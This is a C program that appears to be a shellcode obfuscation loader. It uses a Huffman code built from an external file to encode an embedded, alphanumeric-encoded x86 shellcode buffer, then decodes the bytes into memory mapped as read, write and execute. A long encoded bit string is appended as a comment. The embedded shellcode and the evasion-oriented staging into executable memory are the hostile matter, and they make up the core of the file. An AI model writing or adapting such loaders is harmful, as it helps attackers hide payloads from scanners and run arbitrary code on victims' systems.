#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

typedef struct node_t {
	struct node_t *left, *right;
	int freq;
	char c;
} *node;
 
struct node_t pool[1024] = {{0}};
node qqq[1023], *q = qqq - 1;
int n_nodes = 0, qend = 1;
char *code[256] = {0}, buf[1024];
 
node new_node(int freq, char c, node a, node b)
{
	node n = pool + n_nodes++;
	if (freq) n->c = c, n->freq = freq;
	else {
		n->left = a, n->right = b;
		n->freq = a->freq + b->freq;
	}
	return n;
}
 
/* priority queue */
void qinsert(node n)
{
	int j, i = qend++;
	while ((j = i / 2)) {
		if (q[j]->freq <= n->freq) break;
		q[i] = q[j], i = j;
	}
	q[i] = n;
}
 
node qremove()
{
	int i, l;
	node n = q[i = 1];
 
	if (qend < 2) return 0;
	qend--;
	while ((l = i * 2) < qend) {
		if (l + 1 < qend && q[l + 1]->freq < q[l]->freq) l++;
		q[i] = q[l], i = l;
	}
	q[i] = q[qend];
	return n;
}
 
/* walk the tree and put 0s and 1s */
void build_code(node n, char *s, int len)
{
	static char *out = buf;
	if (n->left == 0 && n->right == 0) {
		s[len] = 0;
		strcpy(out, s);
		code[n->c] = out;
		out += len + 1;
		return;
	}
 
	s[len] = '0'; build_code(n->left,  s, len + 1);
	s[len] = '1'; build_code(n->right, s, len + 1);
}
 
void init(const unsigned char *s,unsigned int len)
{
	int i, freq[256] = {0};
	char c[32];
 
	// while (*s) freq[(int)*s++]++;
	for (i=0; i<len; i++){
		int idx = s[i] & 0xFF;
		if (idx !=0)
			freq[idx] += 1;
	}
 
	for (i = 0; i < 256; i++)
		if (freq[i]) qinsert(new_node(freq[i], i, 0, 0));
 
	while (qend > 2) 
		qinsert(new_node(0, 0, qremove(), qremove()));
 
	build_code(q[1], c, 0);
}
 
void encode(const char *s, char *out)
{
	while (*s) {
		strcpy(out, code[*s]);
		out += strlen(code[*s++]);
	}
}
 
void decode(const char *s, node t,char * mem,unsigned int len)
{
	node n = t;
	unsigned int idx=0;
	while (*s) {
		if (*s++ == '0') n = n->left;
		else n = n->right;
 
		if (n->c) {
			mem[idx++]=n->c , n = t;
			if (idx >= len)
				break;
		}
	}
 
	if (t != n) printf("garbage input\n");
}
void initSymbols(char * fname){
	FILE * f = fopen(fname,"rb");
	fseek(f,0,2);
	unsigned int sz = ftell(f);
	fseek(f,0,0);
	unsigned char * data = (unsigned char *) malloc(sz);
	fread(data,sz,1,f);
	fclose(f);
	init(data,sz);
	free(data);
}
int main(void){
	int i;
	char shell_buf[]= "\x89\xe7\xd9\xf6\xd9\x77\xf4\x58\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x42\x4a\x66\x6b\x53\x68\x4c\x59\x32\x72\x42\x46\x33\x58\x46\x4d\x33\x53\x6f\x79\x4b\x57\x35\x38\x54\x6f\x32\x53\x42\x48\x65\x50\x71\x78\x36\x4f\x43\x52\x50\x69\x52\x4e\x6b\x39\x59\x73\x63\x62\x48\x68\x65\x58\x77\x70\x77\x70\x67\x70\x64\x6f\x33\x52\x73\x59\x72\x4e\x64\x6f\x44\x33\x32\x48\x75\x50\x56\x37\x72\x73\x4e\x69\x78\x61\x5a\x6d\x4b\x30\x41\x41";
	char coded_shell_buf[4096];
	printf("Enter bit string\n");
	initSymbols("etalon");
	// for (i = 0; i < 128; i++)
		// if (code[i]) printf("'%c': %s\n", i, code[i]);
	
	encode(shell_buf, coded_shell_buf);
	printf("encoded: %s\n", coded_shell_buf);
	void * ref = mmap(0,65536, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE,0,0);
	memset(ref,0x0,65536);

	printf("decoded: ");
	decode(coded_shell_buf, q[1],(char *)ref,65536);
	printf("%s",ref);
	return 0;
}
// 11011100001001000110101000110001011010100001111111100110110110110001100110001111001101000011010000110100001101000011010000110100001101000011010000110100001101000000100000001000000010000000100000001000000010000111100110111100101001011000000011111101110110110001100111111111111111101111111111111110101011100111111011111110110111100100000101111110111111010100000101111101011111010111111111111101011111010111111011111101011011011000110011110100101111110111111010010011001001010001101000111110101001010010000101010111000100110111001101100100100001111010000010001111011111101010100110101011001101101110100110010101011010110001001101100110010000110111010000101011110101111111010010100000011001100110000010010011011111101010110001001101110001100110101000110110101111001110001001100010000011100000001100110001000101110000011001100101110001000001000111100101101000101011010001111011000111001101001101111101101100011111101101100001111110110110001000101011011001111111100110011010110001110000010110100001111000111101011001100111111110011001101010011010110010000010101100010100110000011001101100010111100100111101010110100110011000010001101101011011100010100101110111111010000111111111111110111111101